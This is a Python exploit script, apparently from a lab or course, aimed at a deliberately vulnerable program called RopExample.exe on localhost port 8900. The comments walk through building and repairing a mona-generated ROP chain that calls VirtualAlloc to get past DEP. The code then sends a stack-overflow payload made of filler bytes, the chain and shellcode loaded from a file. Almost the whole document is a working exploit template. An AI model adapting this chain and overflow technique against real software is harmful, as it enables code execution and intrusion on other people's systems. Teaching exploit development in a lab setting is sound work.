import socket
import sys
import struct


# The function below can be copied directly from
# the mona output
#
# To search for a rop chain execute the following:
#
# !mona rop -m "kernelbase,rpcrt4,ntdll" -depth 1
#
#
# Keep in mind that if you have issues, you can modify the chain
# manually
#
# The problem is that mona is not perfect, and one of the gadgets it finds
# for you might be problematic.
#
# For example, the gadget from the chain below:
#
# XCHG EAX,ESI # ADD ESI,EDI # DEC ECX # RETN
#
# is problematic, because we want ESI to remain untouched after it is set. 
# However, the very next instruction is "ADD ESI, EDI". If EDI is non-zero, 
# this will not do what we want. You can verify that EDI is non-zero 
# (likely is 00401000). Thus, we can fix this by re-using one of the gadgets 
# found at the end of the chain. Specifically, we want to reuse the 
# "POP EDI / RETN" gadget.
#
# We want to use this gadget BEFORE the problematic gadget. 
# (Ignore the addresses, they will be different for you, but the idea is the same). 
# You can see that we inserted a gadget and value. By doing this, 
# we will set EDI to 0 before the 'add esi, edi' occurs.
#
#                 0x770622f7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#                 0x7667134c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
#                 0x7704adea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#
#                 # New gadget insertered here along with the corresponding data
#                 0x771b9464,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
#                 0x00000000,  # edi-> 0
#
#
#                 0x77243b16, 
#                 0x770a4780,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#                 0x76faf7fd,  # & call esp [KERNELBASE.dll] ** REBASED ** ASLR
#                 0x771b8e65,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR
#                 0x771b97a2,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR
#                 0x00001000,  # 0x00001000-> edx
#                 0x770d094c,  # POP ECX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#                 0x00000040,  # 0x00000040-> ecx
#                 0x771b9464,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
#                 0x7663ae1a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
#                 0x771af353,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
#                 0x90909090,  # nop
#                 0x76f366d8,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#


def create_rop_chain():

   # rop chain generated with mona.py - www.corelan.be
   rop_gadgets = [
                 # REPLACE BETWEEN THESE LINES
                 0x752fd850,  # POP EAX # RETN [KERNELBASE.dll]
                 0x7510a02c,  # ptr to &VirtualAlloc() [IAT bcryptPrimitives.dll]
                 0x7751b462,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll]
                 0x761dbff7,  # XCHG EAX,ESI # RETN 0x02 [RPCRT4.dll]
                 0x7752f87c,  # POP EBP # RETN [ntdll.dll]
                 0x4141,    # Filler (RETN offset compensation)
                 0x7527fdbd,  # & call esp [KERNELBASE.dll]
                 0x74e0540a,  # POP EBX # RETN [WS2_32.dll]
                 0x00000001,  # 0x00000001-> ebx
                 0x77525448,  # POP EDX # RETN [ntdll.dll]
                 0x00001000,  # 0x00001000-> edx
                 0x762337c0,  # POP ECX # RETN [RPCRT4.dll]
                 0x00000040,  # 0x00000040-> ecx
                 0x761e21fa,  # POP EDI # RETN [RPCRT4.dll]
                 0x760fae1a,  # RETN (ROP NOP) [KERNEL32.DLL]
                 0x76211547,  # POP EAX # RETN [RPCRT4.dll]
                 0x90909090,  # nop
                 0x75240620,  # PUSHAD # RETN [KERNELBASE.dll]
                 # REPLACE BETWEEN THESE LINES
   ]

   lv = ''

   # This fixes the 'retn 0x0X' issue
   # where this could be 1, 2 or 3
   for gadget in rop_gadgets:
       if gadget == 0x41:
           lv += '\x41'
       elif gadget == 0x4141:
           lv += '\x41\x41'
       elif gadget == 0x414141:
           lv += '\x41\x41\x41' 
       else:     
           lv += struct.pack('<I', gadget)
   return lv

HOST = "127.0.0.1"    # The remote host
PORT = 8900              # The same port as used by the server

#
# Create a socket..
# We use AF_INET : Address Family Internet (TCP/IP)
# We use SOCK_STREAM : This is connection-oriented (e.g. TCP)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

#
# Ignoring erors, we will attempt to connect to the 
# host, HOST, on port, PORT
# From our RE of RopExample.exe, we know that it listens
# on port 8900.
s.connect( (HOST,PORT) )


f = open('shellcode_DEP','rb')
shellcode = f.read()
f.close()

shellcodelen = len(shellcode)

rop_chain = create_rop_chain()
rop_chainlen = len(rop_chain)

f = open('shellcode_DEP','rb')
shellcode = f.read()
f.close()

shellcodelen = len(shellcode)

#
# We send a size larger than 32-bytes.
# From our stack analysis, we know that we need to send
# 52-bytes of data to consume the return address
# Thus, we can send any data within the first 48-bytes
# and the next 4-bytes will overwrite the return address
# Anything that follows this, will continue to overwrite
# adjacent values on the stack
#
# In this case, we use the length of the shellcode that we
# intend to execute, plus the required overflow size, plus
# the rop_chain that is required to bypass DEP
#
data = struct.pack('<I', shellcodelen + 52 + rop_chainlen )

s.sendall( data )

data = 'B'*(48)

#
data += rop_chain
data += shellcode

s.sendall(data)




